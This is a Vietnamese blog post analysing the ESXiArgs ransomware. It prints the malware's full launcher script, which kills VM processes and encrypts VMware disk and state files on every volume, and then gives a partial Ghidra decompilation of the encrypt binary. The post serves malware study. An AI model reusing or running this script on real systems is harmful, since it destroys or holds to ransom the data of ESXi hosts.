<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Name Nguyễn">
<meta name="description" content="Học cách hoạt động của ransomware ESXiArgs bằng cách dịch ngược nó" />
<meta name="keywords" content="homepage, blog, mã độc, dịch ngược, bảo mật" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://namberino.github.io/en/vietnamese/posts/esxiargs-analysis/" />


    <title>
        
            Phân tích mã độc ESXiArgs :: Nam&#39;s Journal 
        
    </title>





<link rel="stylesheet" href="/main.f328c18cc29e8f38ea9856605ac2b3d52498b99bcd296a7867e57a6cd4ba1ec8.css" integrity="sha256-8yjBjMKejzjqmFZgWsKz1SSYuZvNKWp4Z&#43;V6bNS6Hsg=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="Phân tích mã độc ESXiArgs">
  <meta itemprop="description" content="Học cách hoạt động của ransomware ESXiArgs bằng cách dịch ngược nó">
  <meta itemprop="datePublished" content="2024-04-01T14:42:54+07:00">
  <meta itemprop="dateModified" content="2024-04-01T14:42:54+07:00">
  <meta itemprop="wordCount" content="3480">
  <meta itemprop="image" content="https://namberino.github.io/">
  <meta itemprop="keywords" content="Mã Độc,Dịch Ngược,Bảo Mật">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://namberino.github.io/">
  <meta name="twitter:title" content="Phân tích mã độc ESXiArgs">
  <meta name="twitter:description" content="Học cách hoạt động của ransomware ESXiArgs bằng cách dịch ngược nó">



    <meta property="og:url" content="https://namberino.github.io/en/vietnamese/posts/esxiargs-analysis/">
  <meta property="og:site_name" content="Nam&#39;s Journal">
  <meta property="og:title" content="Phân tích mã độc ESXiArgs">
  <meta property="og:description" content="Học cách hoạt động của ransomware ESXiArgs bằng cách dịch ngược nó">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="vietnamese">
    <meta property="article:published_time" content="2024-04-01T14:42:54+07:00">
    <meta property="article:modified_time" content="2024-04-01T14:42:54+07:00">
    <meta property="article:tag" content="Mã Độc">
    <meta property="article:tag" content="Dịch Ngược">
    <meta property="article:tag" content="Bảo Mật">
    <meta property="og:image" content="https://namberino.github.io/">






    <meta property="article:published_time" content="2024-04-01 14:42:54 &#43;0700 &#43;07" />













<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
            delimiters: [
                {left: "$$", right: "$$", display: true},
                {left: "$", right: "$", display: false}
            ]
        });
    });
</script>


    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                nam$journal</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/en/about/">About</a></li><li><a href="/en/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
                <span class="theme-toggle not-selectable" style="margin-left: 1.5rem; margin-right: 1rem;">
	
        
            
            <a class="active language" style="text-decoration: underline;"> EN </a>
            
                <div style="margin-left: 0.12rem; margin-right: 0.12rem;"> | </div>
            
        
	
        
            
            
        
	

</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://namberino.github.io/en/vietnamese/posts/esxiargs-analysis/">Phân tích mã độc ESXiArgs</a></h2>

            
            
            

            <div class="post-content">
                <p>Năm vừa qua có xảy ra 1 vụ tấn công ransomware gọi là <strong>ESXiArgs</strong>. Vũ tấn công này đã làm mã hóa hàng trăm các máy ảo VMware khác nhau. Và mình quyết định là sẽ thử sức dịch ngược và phân tích mã độc này để xem nó hoạt động thế nào.</p>
<blockquote>
<p>Note: Mẫu mã độc này được lấy từ <a href="https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14#entry5470686">forum bleepingcomputer</a></p>
</blockquote>
<h1 id="script-chạy">Script chạy</h1>
<p>Mình sẽ bắt đầu bằng phân tích script chạy mã đọc trước:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## CHANGE CONFIG</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> config_file in <span style="color:#c678dd">$(</span>esxcli vm process list | grep <span style="color:#98c379">&#34;Config File&#34;</span> | awk <span style="color:#98c379">&#39;{print $3}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;FIND CONFIG: </span><span style="color:#e06c75">$config_file</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>  sed -i -e <span style="color:#98c379">&#39;s/.vmdk/1.vmdk/g&#39;</span> -e <span style="color:#98c379">&#39;s/.vswp/1.vswp/g&#39;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$config_file</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span>
</span></span></code></pre></div><p>Đoạn code này sẽ tìm các file config và đổi các file <code>vmdk</code> sang file <code>vswp</code>. Ở đây cũng ko có gì quá thú vị về mặt phân tích.</p>
<p>Trong đoạn tiếp theo, script này sẽ dừng quá trình tên là <code>VMX</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## STOP VMX</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;KILL VMX&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">kill</span> -9 <span style="color:#c678dd">$(</span>ps | grep vmx | awk <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>
</span></span></code></pre></div><p>Quá trình <code>VMX</code> là quá trình quản lý các thiết bị I/O (Input/Output). Nó cũng hỗ trợ việc giao tiếp giữa interface người dùng, quản lý snapshot của máy ảo và console remote</p>
<p>Đoạn tiếp theo của script là đoạn <em>mã hóa</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## ENCRYPT</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chmod +x <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> volume in <span style="color:#c678dd">$(</span><span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#98c379">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#98c379">&#39;  &#39;</span> <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;START VOLUME: </span><span style="color:#e06c75">$volume</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">$&#39;\n&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">for</span> file_e in <span style="color:#c678dd">$(</span> find <span style="color:#98c379">&#34;/vmfs/volumes/</span><span style="color:#e06c75">$volume</span><span style="color:#98c379">/&#34;</span> -type f -name <span style="color:#98c379">&#34;*.vmdk&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmx&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmxf&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsd&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsn&#34;</span> -o -name <span style="color:#98c379">&#34;*.vswp&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmss&#34;</span> -o -name <span style="color:#98c379">&#34;*.nvram&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmem&#34;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>du -k <span style="color:#e06c75">$file_e</span> | awk <span style="color:#98c379">&#39;{print $1}&#39;</span><span style="color:#c678dd">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#e06c75">$size_kb</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#c678dd">$((</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#c678dd">))</span> -gt <span style="color:#d19a66">128</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$((</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">100</span><span style="color:#56b6c2">)-</span><span style="color:#d19a66">1</span><span style="color:#c678dd">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;START ENCRYPT: </span><span style="color:#e06c75">$file_e</span><span style="color:#98c379"> SIZE: </span><span style="color:#e06c75">$size_kb</span><span style="color:#98c379"> STEP SIZE: </span><span style="color:#e06c75">$size_step</span><span style="color:#98c379">&#34;</span> <span style="color:#98c379">&#34;\&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">\&#34; </span><span style="color:#e06c75">$size_step</span><span style="color:#98c379"> 1 </span><span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">echo</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt; <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">.args&#34;</span>
</span></span><span style="display:flex;"><span>        nohup <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt <span style="color:#e06c75">$CLEAN_DIR</span>/public.pem <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">done</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">$&#34; &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span>
</span></span></code></pre></div><p>Phân tích đoạn này nào:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">for</span> volume in <span style="color:#c678dd">$(</span><span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#98c379">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#98c379">&#39;  &#39;</span> <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span></code></pre></div><p>Vòng lặp đầu tiên sẽ đi qua các cái volume trong folder <code>/vmfs/volumes/</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">for</span> file_e in <span style="color:#c678dd">$(</span> find <span style="color:#98c379">&#34;/vmfs/volumes/</span><span style="color:#e06c75">$volume</span><span style="color:#98c379">/&#34;</span> -type f -name <span style="color:#98c379">&#34;*.vmdk&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmx&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmxf&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsd&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsn&#34;</span> -o -name <span style="color:#98c379">&#34;*.vswp&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmss&#34;</span> -o -name <span style="color:#98c379">&#34;*.nvram&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmem&#34;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span></code></pre></div><p>Vòng lặp thứ 2 sẽ tìm các file trong các volume đó với các đuôi sau:</p>
<ul>
<li><code>.vmdk</code></li>
<li><code>.vmx</code></li>
<li><code>.vmxf</code></li>
<li><code>.vmsd</code></li>
<li><code>.vmsn</code></li>
<li><code>.vswp</code></li>
<li><code>.vmss</code></li>
<li><code>.nvram</code></li>
<li><code>.vmem</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>du -k <span style="color:#e06c75">$file_e</span> | awk <span style="color:#98c379">&#39;{print $1}&#39;</span><span style="color:#c678dd">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#e06c75">$size_kb</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#c678dd">$((</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#c678dd">))</span> -gt <span style="color:#d19a66">128</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$((</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">100</span><span style="color:#56b6c2">)-</span><span style="color:#d19a66">1</span><span style="color:#c678dd">))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
</span></span></code></pre></div><p>Đoạn này của script sẽ tính kích cỡ của các file tìm được trong vòng lặp thứ 2. Số bước để mã hóa file (số MB để skip) sẽ được suy ra từ kích cỡ của file.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nohup <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt <span style="color:#e06c75">$CLEAN_DIR</span>/public.pem <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span></code></pre></div><p>Đường dẫn file, kích cỡ file và số bước mã hóa sẽ được truyền vào trong file nhị phân <code>encrypt</code>. File này cũng lấy 1 cái khóa công khai. Output của câu lệnh này sẽ được truyền vào <code>/dev/null</code> để không output ra console.</p>
<p>Script này cũng dùng <code>nohup</code> để thực thi file nhị phân này trong background. Nó làm vậy để có thể mã hóa nhiều file cùng 1 lúc.</p>
<p>Sau khi mình nghiên cứu về con mã độc này, mình biết là tác giả con mã độc này sẽ dùng 2 file nhị phân là <code>encrypt</code> và <code>decrypt</code>. File <code>decrypt</code> sẽ cần 1 <em>khóa bí mật</em>. Khóa này sẽ được giữ bởi tác giả mã độc và nạn nhân của con mã độc này sẽ cần trả tiền cho tác giả để lấy được khóa bí mật đó.</p>
<p>Mình sẽ phân tích file <code>encrypt</code> bởi vì nó là lõi của mã độc này.</p>
<h1 id="phân-tích-file-nhị-phân-encrypt">Phân tích file nhị phân encrypt</h1>
<p>Đầu tiên thì mình sử dụng câu lệnh <code>file</code> để xem file có những gì:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file encrypt
</span></span><span style="display:flex;"><span>encrypt: ELF 64-bit LSB executable, x86-64, version <span style="color:#d19a66">1</span> <span style="color:#56b6c2">(</span>SYSV<span style="color:#56b6c2">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#c678dd">for</span> GNU/Linux 2.6.8, with debug_info, not stripped
</span></span></code></pre></div><p>Mình thấy là nó là file <code>ELF 64-bit</code>  bởi vì mã độc này chạy trên các bộ xử lý x64. <code>dynamically linked</code> có nghĩa là mã độc này được biên dịch với <code>GCC</code> bình thường, không sử dụng cờ biên dịch gì phức tạp.</p>
<p>Nó cũng được biên dịch cho <code>GNU/Linux 2.6.8</code>. Đây là 1 phiên bản Linux khá là cũ.</p>
<p>Có 1 điều lạ ở đây là file nhị phân này có <code>debug_info, not stripped</code>. Thường thì các tác giả mã độc sẽ &ldquo;lột&rdquo; các thông tin debug từ 1 cái file nhị phân bởi vì họ không muốn mã độc của họ bị phân tích và dịch ngược. Nhưng mà mã độc ESXiArgs này lại vẫn còn các thông tin debug. Tức là các hàm trong file này vẫn còn các thông tin và file này cũng còn giữ thông tin từ <code>GCC</code> về quá trình biên dịch của nó.</p>
<p>Tiếp theo thì mình chạy thử câu lệnh <code>strings</code> để xem bên trong file nhị phân này có những gì:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings encrypt
</span></span></code></pre></div><p>Bởi vì file không bị làm rối và bị &ldquo;lột&rdquo;, mình đi tìm thông tin liên quan đến mã hóa và mình tìm được cái này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>BIO_new_mem_buf
</span></span><span style="display:flex;"><span>ERR_get_error
</span></span><span style="display:flex;"><span>ERR_error_string
</span></span><span style="display:flex;"><span>PEM_read_bio_RSA_PUBKEY
</span></span><span style="display:flex;"><span>PEM_read_bio_RSAPrivateKey
</span></span><span style="display:flex;"><span>RAND_pseudo_bytes
</span></span><span style="display:flex;"><span>RSA_public_encrypt
</span></span><span style="display:flex;"><span>RSA_private_decrypt
</span></span><span style="display:flex;"><span>RSA_size
</span></span></code></pre></div><p><code>PEM_read_bio_RSA_PUBKEY</code> sẽ đọc file khóa công khai. <code>PEM_read_bio_RSAPrivateKey</code> sẽ đọc file khóa bí mật. <code>RAND_pseudo_bytes</code> sẽ tạo ra byte random, byte này chắc sẽ được sử dụng cho việc mã hóa.</p>
<p>Mình cũng tìm được <code>RSA_public_encrypt</code> và <code>RSA_private_decrypt</code>. Thế file nhị phân này chắc sẽ sử dụng thuật toán mã hóa bất đối xứng <strong>RSA</strong>.</p>
<p><em>Mã hóa bất đối xứng</em> nó như là 1 hòm thư. Hòm thư là 1 vật công cộng, ai cũng có thể đút thư vào nó. Nhưng chỉ có chủ của hòm thư đó mới có chìa khóa để mở hòm thư đó và đọc thư trong đó.</p>
<p><em>Mã hóa bất đối xứng</em> cũng giống như vậy. Nó sử dụng 2 khóa, <em>khóa công khai</em> và <em>khóa bí mật</em>. Khóa công khai sẽ được phân phát cho các máy khác. Khi mà 1 người nào đó muốn gửi dữ liệu cho mình thì họ sẽ sử dụng khóa công khai của mình để mã hóa dữ liệu và mình sẽ sử dụng khóa bí mật của mình để giải mã dữ liệu đã được mã hóa. Phương thức này rất an toàn bởi vì nếu như hacker lấy được cả dữ liệu và khóa công khai thì họ cũng không thể làm gì được bởi vì khóa công khai không thể giải mã được, nó chỉ mã hóa được. Một khi dữ liệu được mã hóa với khóa công khai thì nó chỉ có thể được giải mã bằng khóa bí mật.</p>
<p>File nhị phân này sẽ sử dụng <code>RSA_public_encrypt</code> với 1 khóa công khai để mã hóa các file và <code>RSA_private_decrypt</code> với 1 khóa bí mật để giải mã các file.</p>
<p>Để tìm hiểu sâu hơn về mã độc này, mình sẽ sử dụng 1 chương trình phân dịch để dịch ngược file này.</p>
<h1 id="phân-dịch-file-nhị-phân">Phân dịch file nhị phân</h1>
<p>Mình sẽ sử dụng chương trình phân dịch <a href="https://ghidra-sre.org/">[<strong>Ghidra</strong>]</a> bởi vì mình đang học cách dùng nó.</p>

    <img src="/img/esxiargs-analysis/ghidra-esxiargs.png"  alt="ESXiArgs trong Ghidra"  class="center"  style="padding: 10px"  />


<p>Đây là hàm <code>main</code> trong file nhị phân <code>encrypt</code> này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e5c07b">long</span> <span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_4c</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_38</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_30</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_28</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">local_20</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">local_18</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">local_c</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">3</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x18</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x20</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">5</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
